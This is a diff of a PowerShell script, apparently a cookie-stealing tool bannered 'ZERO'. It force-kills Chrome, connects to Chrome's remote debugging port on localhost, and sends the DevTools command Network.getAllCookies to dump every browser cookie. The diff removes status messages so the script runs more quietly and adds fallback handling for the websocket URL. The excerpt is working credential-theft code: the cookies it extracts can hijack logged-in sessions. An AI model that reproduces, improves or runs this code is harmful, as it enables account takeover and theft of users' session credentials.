@@ -1,4 +1,4 @@
-Write-Host "  ZZZZ    EEEEE   RRRR     OOO  "
+ Write-Host "  ZZZZ    EEEEE   RRRR     OOO  "
 Write-Host "     Z    E       R   R   O   O "
 Write-Host "    Z     EEEE    RRRR    O   O "
 Write-Host "   Z      E       R R     O   O "
@@ -15,9 +15,6 @@ $URL = "https://google.com"
 function quitx(){
     if (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
         Stop-Process -Name "chrome" -Force
-        Write-Host "Chrome process has been terminated."
-    } else {
-        Write-Host "Chrome is not running."
     }
 }
 
@@ -67,6 +64,11 @@ $jsonUrl = "http://localhost:$remoteDebuggingPort/json"
 $jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get
 $url_capture = $jsonData.webSocketDebuggerUrl
 $Message = '{"id": 1,"method":"Network.getAllCookies"}'
-$response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message
-Write-Host $response
-quitx 
+if ($url_capture[0].Length -ge 2) {
+    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message
+    Write-Host $response
+} else {
+    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture -Message $Message
+    Write-Host $response
+}
+quitx  
